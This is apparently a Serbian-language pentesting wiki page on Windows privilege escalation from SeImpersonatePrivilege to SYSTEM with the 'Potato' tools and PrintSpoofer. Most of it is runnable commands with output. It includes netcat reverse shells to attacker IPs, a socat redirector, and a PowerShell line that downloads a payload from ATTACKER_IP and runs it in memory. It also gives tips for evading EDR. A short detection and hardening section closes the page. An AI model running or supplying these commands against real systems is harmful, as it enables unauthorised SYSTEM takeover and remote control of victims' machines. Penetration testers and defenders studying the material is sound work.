# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato ne radi** na Windows Server 2019 i Windows 10 build 1809 i novijim. Međutim, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** mogu da se koriste za iskorišćavanje istih privilegija i dobijanje pristupa na nivou `NT AUTHORITY\SYSTEM`.** Ovaj [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) detaljno obrađuje alat `PrintSpoofer`, koji se može koristiti za zloupotrebu impersonation privilegija na Windows 10 i Server 2019 hostovima gde JuicyPotato više ne radi.

> [!TIP]
> Moderan alternativ koji se često održava 2024–2025 je SigmaPotato (fork GodPotato) koji dodaje upotrebu in-memory/.NET reflection i proširenu podršku za OS. Pogledajte brz primer upotrebe ispod i repo u referencama.

Povezane stranice za pozadinu i ručne tehnike:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Zahtevi i česte zamke

Sve sledeće tehnike se oslanjaju na zloupotrebu privilegovanog servisa sposoban za impersonaciju iz konteksta koji poseduje neku od sledećih privilegija:

- SeImpersonatePrivilege (najčešće) ili SeAssignPrimaryTokenPrivilege
- Visok integritet nije potreban ako token već ima SeImpersonatePrivilege (tipično za mnoge servisne naloge kao što su IIS AppPool, MSSQL, itd.)

Brzo proverite privilegije:
```cmd
whoami /priv | findstr /i impersonate
```
Operativne beleške:

- Ako vaša shell sesija radi pod ograničenim tokenom bez SeImpersonatePrivilege (uobičajeno za Local Service/Network Service u nekim kontekstima), povratite podrazumevane privilegije naloga koristeći FullPowers, pa onda pokrenite Potato. Primer: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer zahteva da Print Spooler servis radi i da mu se može pristupiti preko lokalne RPC endpoint (spoolss). U ojačanim okruženjima gde je Spooler onemogućen nakon PrintNightmare, preferirajte RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato zahteva OXID resolver dostupan na TCP/135. Ako je izlaz (egress) blokiran, koristite redirector/port-forwarder (vidi primer ispod). Starije verzije su zahtevale -f flag.
- EfsPotato/SharpEfsPotato zloupotrebljavaju MS-EFSR; ako je jedan pipe blokiran, pokušajte alternativne pipe-ove (lsarpc, efsrpc, samr, lsass, netlogon).
- Greška 0x6d3 tokom RpcBindingSetAuthInfo obično ukazuje na nepoznatu/neudržavanu RPC autentikacionu uslugu; pokušajte drugi pipe/transport ili se uverite da ciljna usluga radi.

## Brzi demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Napomene:
- Možete koristiti -i da pokrenete interaktivni proces u trenutnoj konzoli, ili -c da izvršite one-liner.
- Zahteva Spooler servis. Ako je onemogućen, ovo neće uspeti.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Ako je outbound 135 blokiran, pivot the OXID resolver via socat on your redirector:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Savet: Ako jedna pipe zakaže ili ju EDR blokira, pokušajte druge podržane pipe:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Napomene:
- Radi na Windows 8/8.1–11 i Server 2012–2022 kada je prisutno SeImpersonatePrivilege.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato nudi dve varijante koje ciljaju servisne DCOM objekte koji podrazumevano koriste RPC_C_IMP_LEVEL_IMPERSONATE. Kompajlirajte ili koristite priložene binarne i pokrenite svoju komandu:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (ažuriran GodPotato fork)

SigmaPotato dodaje modernije pogodnosti kao što su in-memory execution putem .NET reflection i PowerShell reverse shell helper.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## Beleške o detekciji i ojačavanju

- Pratite procese koji kreiraju named pipes i odmah pozivaju token-duplication APIs, a zatim CreateProcessAsUser/CreateProcessWithTokenW. Sysmon može prikazati korisnu telemetriju: Event ID 1 (process creation), 17/18 (named pipe created/connected) i komandne linije koje spawn-uju child processes kao SYSTEM.
- Ojačavanje spoolera: Isključivanje Print Spooler servisa na serverima gde nije potrebno sprečava PrintSpoofer-style lokalne prisile preko spoolss.
- Ojačavanje naloga servisa: Smanjite dodeljivanje SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege prilagođenim servisima. Razmotrite pokretanje servisa pod virtualnim nalozima sa najmanjim potrebnim privilegijama i izolovanje pomoću service SID i write-restricted tokens kad je moguće.
- Mrežne kontrole: Blokiranje outbound TCP/135 ili ograničavanje RPC endpoint mapper saobraćaja može prekinuti RoguePotato osim ako nije dostupan interni redirector.
- EDR/AV: Svi ovi alati su široko detektovani po potpisima. Recompiling from source, renaming symbols/strings ili korišćenje in-memory execution može smanjiti detekciju, ali neće zaobići robusne behavioral detections.

## References

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)

{{#include ../../banners/hacktricks-training.md}}
